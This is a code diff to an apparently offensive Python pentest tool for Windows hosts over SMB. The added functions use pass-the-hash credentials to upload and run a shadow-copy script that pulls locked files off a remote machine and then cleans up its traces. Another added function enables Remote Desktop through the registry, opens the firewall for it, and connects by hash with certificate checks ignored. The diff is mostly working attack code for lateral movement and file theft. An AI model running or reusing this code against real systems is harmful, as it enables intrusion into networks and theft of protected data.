@@ -32,7 +32,6 @@ BASEDIR = os.path.dirname(os.path.realpath(__file__)) + '/tools'
 TOOLS = {
 	'smbclient': BASEDIR +  '/smbclient', # Version with Pass-The-Hash support
 	'winexe': BASEDIR + '/winexe', # Version with Pass-The-Hash support
-	'portforward': BASEDIR + '/win/portforward.exe',
 	'vsscpy': BASEDIR + '/win/vsscpy.vbs',
 	'xfreerdp': BASEDIR + '/xfreerdp',
 	'socat': BASEDIR + '/socat',
@@ -40,7 +39,6 @@ TOOLS = {
 	'tar': BASEDIR + '/win/tar.exe',
 	'nircmd': BASEDIR + '/win/nircmd.exe',
 	'runastask': BASEDIR + '/win/runastask.exe',
-	'vncserver': {'exe': BASEDIR + '/win/winvnc.exe', 'dll': BASEDIR + '/win/VNCHooks.dll'},
 	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe'},
 }
 CONF = {
@@ -79,9 +77,6 @@ def main():
 		if not os.path.exists(CONF['creds_file']):
 			text("[!] %s: file not found." % CONF['creds_file'])
 			sys.exit(0)
-
-	#if os.path.basename(sys.argv[0]) == os.path.basename(__file__):
-	#	sys.argv.pop(0)
 
 	# Check command validity and jump to main function
 	command = 'smb_%s' % sys.argv[1]
@@ -282,6 +277,7 @@ def smbclient(cmd):
 	run.append(cmd)
 
 	process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
+	
 	ret = process.stdout.read()
 	ret = ret.replace('\x00', '')
 	return ret.strip()
@@ -302,19 +298,19 @@ def winexe(cmd):
 	run.append('//'+ CONF['smb_ip'])
 	run.append(cmd)
 
-
-	if cmd.lower() == 'cmd':
-		os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
-		return ''
-	
-	else:
+	if cmd.lower() != 'cmd':
 		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
+		
 		ret = process.stdout.read()
 		ret = ret.replace('\x00', '')
 		return ret.strip()
 
+	# For an interactive command line, don't use popen
+	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
+	return ''
+
 def os_architecture():
-	check = smbclient_cmd('dir "\Program Files (x86)"')
+	check = smbclient('dir "\Program Files (x86)"')
 
 	if 'NO_SUCH_FILE' in check:
 		return 32
@@ -439,7 +435,31 @@ def smb_vsscpy():
 	Use shadow copies to download a locked file from the host
 	"""
 
-	print 'smb_vsscpy'
+	check_tool('vsscpy')
+	set_creds(5, 7)
+
+	if len(sys.argv) != 5:
+		usage()
+
+	check_creds()
+
+	remotefile = sys.argv[3]
+	localfile = sys.argv[4]
+
+	text("[*] Uploading script...")
+	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])
+
+	text("[*] Running script...")
+	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))
+
+	text("[*] Downloading file...")
+	print smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)
+
+	text("[*] Removing temp files...")
+	smbclient('del "\\windows\\temp\\temp.tmp"')
+	smbclient('del "\\windows\\temp\\vsscpy.vbs"')
+
+	text("[*] Done.");
 
 def smb_fwrule(action = None, param = None):
 	"""
@@ -509,14 +529,61 @@ def smb_mount():
 
 	os.system('sudo mount -t cifs -o "%s" "//%s/%s" "%s"' % (','.join(opts), CONF['smb_ip'], share, localdir))
 
-
 def smb_rdp():
 	"""
 	<ip> [ user ] [ password | ntlm_hash ] [ enable | disable ]
 	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
 	"""
 
-	print 'smb_rdp'
+	if 'enable' in sys.argv:
+		set_creds(4, 6)
+		text("[*] Updating Registry...")
+		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
+		smb_fwrule('add', 3389)
+		sys.exit(0)
+
+	if 'disable' in sys.argv:
+		set_creds(4, 6)
+		text("[*] Updating Registry...")
+		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
+		smb_fwrule('del', 3389);
+		sys.exit(0)
+
+	set_creds(3, 5)
+	check_tool('xfreerdp')
+
+	res = screen_resolution()
+	max_res = '%dx%d' % (int(res[0]), int(res[1]) - 50)
+
+	run = []
+	run.append(TOOLS['xfreerdp'])
+	run.append('/size:%s' % max_res)
+	run.append('/t:%s' % CONF['smb_ip'])
+	run.append('/v:%s' % CONF['smb_ip'])
+
+	if '\\' in CONF['smb_user']:
+		tab = CONF['smb_user'].split('\\', 2)
+		run.append('/d:%s' % tab[0])
+		run.append('/u:%s' % tab[1])
+
+	else:
+		run.append('/u:%s' % CONF['smb_user'])
+
+	if CONF['smb_pass'] == '':
+		text("[!] Note: Pass-the-Hash with RDP only works for local admin accounts and under the restricted admin mode.")
+		run.append('/pth:%s' % CONF['smb_hash'])
+		run.append('/restricted-admin')
+
+	else:
+		run.append('/p:%s' % CONF['smb_pass'])
+
+	# Tweak the following to suit your needs
+	run.append("+clipboard")
+	run.append("+home-drive")
+	run.append("-decorations")
+	run.append("/cert-ignore") # baaad.
+
+	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
 
 def smb_portfwd():
 	"""
@@ -524,23 +591,15 @@ def smb_portfwd():
 	Forward a remote port to a remote address
 	"""
 
-	print 'smb_portfwd'
+	print 'smb_portfwd not yet implemented'
 
-def smb_revtun():
+def smb_revfwd():
 	"""
 	[-s] <ip> [ user ] [ password | ntlm_hash ] <lport> <rhost> <rport>
 	Reverse-forward a remote address/port locally
 	"""
 
-	print 'smb_revtun'
-
-def smb_revvnc():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ]
-	Initiates a reverse VNC session through socat
-	"""
-
-	print 'smb_revvnc'
+	print 'smb_revtun not yet implemented'
 
 def smb_mbsa():
 	"""
@@ -548,7 +607,7 @@ def smb_mbsa():
 	Run MBSA on the remote host
 	"""
 
-	print 'smb_mbsa'
+	print 'smb_mbsa not yet implemented'
 
 def smb_creds():
 	"""
